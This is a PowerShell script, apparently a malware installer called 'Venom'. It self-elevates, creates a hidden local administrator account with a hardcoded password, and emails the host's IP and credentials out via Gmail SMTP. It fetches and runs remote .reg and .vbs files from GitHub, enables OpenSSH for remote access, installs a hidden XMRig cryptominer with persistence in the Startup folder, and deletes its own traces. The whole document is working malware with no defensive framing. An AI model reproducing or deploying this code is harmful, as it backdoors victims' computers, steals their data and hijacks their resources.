
function random_text {
    return -join ((97..122)+(65..90) | Get-Random -Count 5 | % {[char]$_})
}

# Check for Administrator Privileges
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Exit
} else {
    # Create a new local admin account
    Set-Variable -Name username -Value (".Venom")
    Set-Variable -Name Password -Value (ConvertTo-SecureString ".V3n0m" -AsPlainText -Force)
    New-LocalUser $username -Description "Local admin account created via PowerShell" -FullName ".Venom" -Password $Password
    Add-LocalGroupMember -Member $username -Group "Administrators"
}

# Generate Random Working Directory and Paths
Set-Variable -Value (random_text) -Name wd
Set-Variable -Value ("$env:temp\$wd") -Name path
Set-Variable -Value (Get-Location) -Name INITIALPATH
Set-Variable -Value ("C:\Users\darkd\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup") -Name initial_dir

# Read Email and Password from Files
Set-Variable -Name email -Value (Get-Content PkUbTvqXFIdB.txt)
Set-Variable -Value (Get-Content NzKnmxLrbsBw.txt) -Name password

# Get Network Interface and IP Address
Set-Variable -Value ((Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }).InterfaceAlias) -Name InterfaceAlias
Set-Variable -Value ((Get-NetIPAddress -InterfaceAlias $InterfaceAlias -AddressFamily IPv4).IPAddress) -Name IP

# Save IP Address to File
Set-Variable -Name ipFile -Value ("$initial_dir\ip.txt")
$IP | Out-File -FilePath $ipFile

# Create Configuration File
Set-Variable -Name configfile -Value ("$env:UserName.rat")
Set-Content -Value "" -Path $configfile
Add-Content -Value $IP -Path $configfile
Add-Content -Path $configfile -Value $password
Add-Content -Path $configfile -Value $INITIALPATH
Add-Content -Value $env:temp -Path $configfile

# Convert Secure Password to Plain Text
Set-Variable -Name SecurePassword -Value (ConvertTo-SecureString $password -AsPlainText -Force)
Set-Variable -Value ([Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword))) -Name plainPassword
Add-Content -Path $configfile -Value $plainPassword

# Send Email with Configuration File
Send-MailMessage `
    -SmtpServer "smtp.gmail.com" `
    -Subject "IP Address Notification from $env:UserName" `
    -From $email `
    -Attachment $configfile `
    -To $email `
    -Credential (New-Object -ArgumentList $email, (ConvertTo-SecureString -AsPlainText -String $plainPassword -Force) -TypeName System.Management.Automation.PSCredential) `
    -Port 587 `
    -UseSsl

# Copy and Remove Configuration File
Remove-Item -Path $configfile

# Create and Change to Working Directory
mkdir $path
cd $path

# Download Files
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wrev.reg" -OutFile "QyjAaZDBbNPk.reg"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/calty.vbs" -OutFile "FoRAUwtxKkSB.vbs"
Invoke-WebRequest -OutFile "config.json" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/config.json"
Invoke-WebRequest -OutFile "ZDaFvwjOosKx.vbs" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/RunHidden.vbs"

# Install and Configure OpenSSH Server
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -StartupType 'Automatic' -Name sshd
Get-NetFirewallRule -Name *ssh*

# Run Downloaded Scripts
& "./QyjAaZDBbNPk.reg"
& "./FoRAUwtxKkSB.vbs"

# Move RunHidden.vbs and Pause
Move-Item -Path "$path\ZDaFvwjOosKx.vbs" -Destination $initial_dir

Start-Sleep -Seconds 30

# Create New Directory and Change to It
New-Item -ItemType Directory -Path "$path" -Name "$wd"
cd $wd
Set-Variable -Name currentDir -Value ($Pwd)

# Download and Extract XMRig
Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -OutFile "xmrig-6.22.2-msvc-win64.zip"
Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$initial_dir"

Set-ItemProperty -Path "$initial_dir\xmrig-6.22.2" -Name Attributes -Value "Hidden"

# Replace XMRig Configuration File
Set-Variable -Value ("$path\config.json") -Name newConfigPath
Set-Variable -Value ("$initial_dir\xmrig-6.22.2\config.json") -Name targetConfigPath
if (Test-Path -Path $newConfigPath) {
    Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
    Write-Output "Config.json file has been replaced successfully."
} else {
    Write-Output "New config.json file not found at the specified path."
}


# Clean Up
Remove-Item -Path "$initial_dir\ip.txt"

# Hide Venom User Directory
Set-Location -Path 'C:\Users'
if (Test-Path -Path '.Venom' -PathType Container) {
    attrib +h +s +r .Venom
    Write-Output ".Venom directory attributes set to hidden, system, and read-only"
} else {
    Write-Output ".Venom directory does not exist"
    Exit 1
}


cd $path
Remove-Item -Path "config.json"
Remove-Item -Path "QyjAaZDBbNPk.reg"
Remove-Item -Path "FoRAUwtxKkSB.vbs"

Set-ItemProperty -Name Attributes -Path "$initial_dir\ZDaFvwjOosKx.vbs" -Value "Hidden"

cd $initial_dir

# Start Autorun
Start-Process -ArgumentList "ZDaFvwjOosKx.vbs" -windowstyle hidden -FilePath "cscript.exe"

# Start Rig
Start-Process -FilePath "$initial_dir\xmrig-6.22.2\xmrig.exe" -windowstyle hidden 

# Pause for 200 seconds
Start-Sleep -Seconds 200

# Delete Installer Script and IP File
Remove-Item -Path "$initial_dir\ip.txt"
Remove-Item -Path "$initial_dir\NzKnmxLrbsBw.txt"
Remove-Item -Path "$initial_dir\PkUbTvqXFIdB.txt"
Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1"
